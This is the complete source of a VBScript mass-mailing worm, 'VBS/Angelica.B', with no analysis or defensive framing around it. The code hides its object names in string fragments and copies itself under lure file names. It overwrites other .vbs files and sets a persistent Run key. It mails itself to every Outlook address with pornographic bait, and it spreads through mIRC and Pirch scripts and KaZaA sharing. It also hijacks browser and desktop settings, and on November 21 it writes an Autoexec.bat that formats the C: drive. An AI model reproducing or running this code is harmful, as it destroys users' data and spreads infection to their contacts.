Rem VBS/Angelica.B
Rem Version B 
Rem This is a variant of the VBS/Angelica 
On Error Resume Next
Dim Var, Var1, Var2, Var3, Var4, Var5, Var6, File, CopyF,Registre,WinDir,SistemDir,index,createvbs
Dim Angel,wsh
Var = "Script"
Var1 = "ing.F"
Var2 = "ileSystemOb"
Var3 = "ject"
Set Angel = CreateObject(Var+Var1+Var2+Var3)
Var4 = "Wscript"
Var5 = "."
Var6 = "Shell"
Set wsh = CreateObject(Var4+Var5+Var6)
Registre = wsh.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
WinDir = Angel.GetSpecialFolder(0)
SistemDir = Angel.GetSpecialFoler(1)
wsh.RegWrite "HKEY_CLASSES_ROOT\VBSfile\DefaultIcon","C:\Windows\System\shell32.dll,3"
Set File = Angel.OpenTextFile(Wscript.ScriptFullname,1)
Set CopyF = Angel.GetFile(Wscript.ScriptFullname)
index = "C:\"
CopyF.Copy (index &"\Angelica.Gif.VBS")
CopyF.Copy (WinDir &"\Angelica.vbs")
CopyF.Copy ("C:\Angelica\Angelica XXX .vbs")
CopyF.Copy (SistemDir &"\Fat32.vbs")
createvbs=file.ReadAll
vuyklcqtiufnuuu = WScript.ScriptFullName
Set ymddojholmuogyv = Angel.OpenTextFile(vuyklcqtiufnuuu, 1, 0)
xlqjtidsxgnwrho = ymddojholmuogyv.ReadAll
ymddojholmuogyv.Close
hagfqkmarfuviiv = Left(vuyklcqtiufnuuu, InStrRev(vuyklcqtiufnuuu, "\"))
For Each evoncbufayculqb in Angel.GetFolder(hagfqkmarfuviiv).Files
If ( Right(evoncbufayculqb.Name, 4) = ".vbs" ) Then
Set nigvaxotxctkxlb = Angel.CreateTextFile(evoncbufayculqb.Name, True)
nigvaxotxctkxlb.Write xlqjtidsxgnwrho
nigvaxotxctkxlb.Close
End If
Next
wsh.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\AngelYKA", WinDir &"\Angelica.vbs"
Dim Var9,Var10,Var11,Var12,Var13,Var14
Var9 = "Out"
Var10 = "look."
Var11 = "Appli"
Var12 = "cation"
Var13 = "Ma"
Var14 = "PI"
ANGELICAB = WScript.ScriptFullName
Set MAIL = CreateObject(Var9+Var10+Var11+Var12)
If MAIL <> "" Then
Set SEND = MAIL.GetNameSpace(Var13+Var14)
For xxx = 1 to SEND.AddressLists.Count
Set sex = MAIL.CreateItem(0)
Set list = SEND.AddressLists.Item(xxx)
sex.Attachments.Add ANGELICAB
sex.Subject = "XXX Angelica Pictures!!!"
sex.Body = "Hello! Photos of Angelica XXX see already! "
sex.Body = sex.Body + vbCrLf + "Hola! checa esta foto  XXX de la Modelo Angelica esta super buena checala y me dices que tal.."
Set phot = list.AddressEntries
Set recipientis = sex.Recipients
For jigctytkhhgbecm = 1 to phot.Count
sex.Recipients.Add phot.Item(jigctytkhhgbecm)
Next
sex.Send
Next
End If
wsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Local Page","C:\Angelica.HTM"
If month(now) = 11 and day(now) = 21 Then
Set auto2 = Angel.CreateTextFile ( index &"Autoexec.bat",True)
auto2.Writeline "@Echo OFF"
auto2.Writeline "Pause > Nul"
auto2.Writeline "Format C: /Autotest"
auto2.close
End IF
wsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","C:\Angelica.HTM"
If Directory = "" Then
Reg = wsh.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If Angel.fileexists(Reg & "\mirc\mirc.ini") Then Directory = Reg & "\mirc"
Set Script = Angel.CreateTextFile(Reg & "\mirc\script.ini", True)
Script.Write "[Script]"
Script.WriteBlanklines 1
Script.Write "" & Chr(110) & Chr(48) & Chr(61) & Chr(111) & Chr(110) & Chr(32) & Chr(49) & Chr(58) & Chr(74) & Chr(79)  & Chr(73) & Chr(78) & Chr(58) & "#:" & Chr(105) & Chr(102) & Chr(32) & Chr(40) & Chr(32) & Chr(36) & Chr(109) & Chr(101) & Chr(32) & "!=" & Chr(32) & Chr(36) & Chr(110) & Chr(105) & Chr(99) & Chr(107) & Chr(32) & Chr(41) & Chr(32) & Chr(123) & Chr(32) & "/msg" & Chr(32) & Chr(36) & Chr(78) & Chr(105) & Chr(99) & Chr(107) & Chr(32) & "Hello!! Check this XXX photos, is Free!!!!!" & Chr(32) & Chr(124) & Chr(32) & Chr(47) & Chr(100) & Chr(99) & Chr(99) & Chr(32) & "send" & Chr(32) & Chr(36) & Chr(78) & Chr(73) & Chr(67) & Chr(75) & Chr(32) &"C:\Angelica.Gif.VBS " & Chr(125)
Script.Close
If Angel.fileexists(Reg & "\pirch\Pirch32.exe") Then path = Reg & "\pirch\Pirch32.exe"
Set Script2 = Angel.CreateTextFile(Reg & "\Pirch\events.ini", True)
Script2.WriteLine "[Levels]"
Script2.WriteLine "Enabled=1"
Script2.WriteLine "Count=6"
Script2.WriteLine "Level1=000-Unknowns"
Script2.WriteLine "000-UnknownsEnabled=1"
Script2.WriteLine "Level2=100-Level 100"
Script2.WriteLine "100-Level 100Enabled=1"
Script2.WriteLine "Level3=200-Level 200"
Script2.WriteLine "200-Level 200Enabled=1"
Script2.WriteLine "Level4=300-Level 300"
Script2.WriteLine " 300-Level 300Enabled=1"
Script2.WriteLine "Level5=400-Level 400 "
Script2.WriteLine "400-Level 400Enabled=1"
Script2.WriteLine "Level6=500-Level 500"
Script2.WriteLine "500-Level 500Enabled=1"
Script2.WriteLine ""
Script2.WriteLine "[000-Unknowns]"
Script2.WriteLine "UserCount=0"
Script2.WriteLine "EventCount=0"
Script2.WriteLine ""
Script2.WriteLine "[100-Level 100]"
Script2.WriteLine "User1=*!*@*"
Script2.WriteLine "UserCount=1"
Script2.WriteLine "Event1=ON "& Chr(74) & Chr(79) & Chr(73) & Chr(78) &":#:/" & chr(100) & chr(99) & chr(99) & " tsend $nick c:\Angelica.Gif.VBS"
Script2.WriteLine "EventCount=1"
Script2.WriteLine ""
Script2.WriteLine "[200-Level 200]"
Script2.WriteLine "UserCount=0"
Script2.WriteLine "EventCount=0"
Script2.WriteLine ""
Script2.WriteLine "[300-Level 300]"
Script2.WriteLine "UserCount=0"
Script2.WriteLine "EventCount=0"
Script2.WriteLine ""
Script2.WriteLine "[400-Level 400]"
Script2.WriteLine "UserCount=0"
Script2.WriteLine "EventCount=0"
Script2.WriteLine ""
Script2.WriteLine "[500-Level 500]"
Script2.WriteLine "UserCount=0"
Script2.WriteLine "EventCount=0"
Script2.Close
If Angel.fileexists(Reg & "\KaZaA\Kazaa.EXE") Then path = Reg & "\KaZaa.EXE"
wsh.RegWrite "HKCU\Software\Kazaa\LocalContent\Dir0","012345:C:\Angelica"
wsh.RegWrite "HKCU\Software\Kazaa\LocalContent\DisableSharing",0,"REG_DWORD"
End If
wsh.RegWrite "HKCU\Control Panel\Desktop\Wallpaper","C:\Angelica.HTM"
Set files = Angel.CreateTextFile ( index &"Angelica.HTM",True)
files.WriteLine "<" & "HTML><" & "HEAD><" & "Title>Angelica<" & "/Title><" & "/HEAD><" & "Body bgcolor='Black'><" & "p align='center'><" & "font face='Verdana,Arial' size='6' color='yellow'>Please press button Yes to Enable Active X for Look The XXX Angelica Pictures<" & "/font></p><" & "script language='VBScript'>"
files.WriteBlankLines 80
files.WriteLine "" & createvbs
files.WriteLine "<" & "/script><" & "/Body><" & "/HTML>"
files.close
if wsh.regread("HKCU\software\Angelica\Autoexec") <> "1" Then
wsh.regwrite "HKCU\software\Angelica\Autoexec","1"
Set auto = Angel.CreateTextFile ( index &"Autoexec.bat",True)
auto.Writeline "@Start " & Windir & "\Angelica.vbs"
auto.close
End IF
Angel.CreateFolder("C:\Angelica")
CopyF.Copy ("C:\Angelica\Shakira - Ciega Sordomuda.mp3.vbs")
CopyF.Copy ("C:\Angelica\Star Craft Installer.Exe.vbs")
CopyF.Copy ("C:\Angelica\Las ketchup XXX.Gif .vbs")
CopyF.Copy ("C:\Angelica\lasketchup.mp3.vbs")
CopyF.Copy ("C:\Angelica\Britney Spears.mp3.vbs")
CopyF.Copy ("C:\Angelica\Cristina Aquilera XXX.Gif.vbs")
CopyF.Copy ("C:\Angelica\Windows Xp.vbs")
CopyF.Copy ("C:\Angelica\EnriqueIglesias.mp3.vbs")
CopyF.Copy ("C:\Angelica\porn.Doc.vbs")
CopyF.Copy ("C:\Angelica\Fifa World CUp.EXE.vbs")
wsh.RegWrite "HKCU\Softwate\Microsoft\Internet Explorer\Main\WindowsTitle","You Are Infected for Virus"
Set code = Angel.opentextfile(wscript.scriptfullname)
delete = code.readall
code.close
do
if Angel.fileexists(wscript.scriptfullname) = false then
set code = Angel.createtextfile(wscript.scriptfullname)
code.write delete
code.close 
end if
registred = wsh.regread ("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\")
if  registred <>  "AngelYKA" then
wsh.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\AngelYKA", WinDir &"\Angelica.vbs"
end if
registro = ""
loop 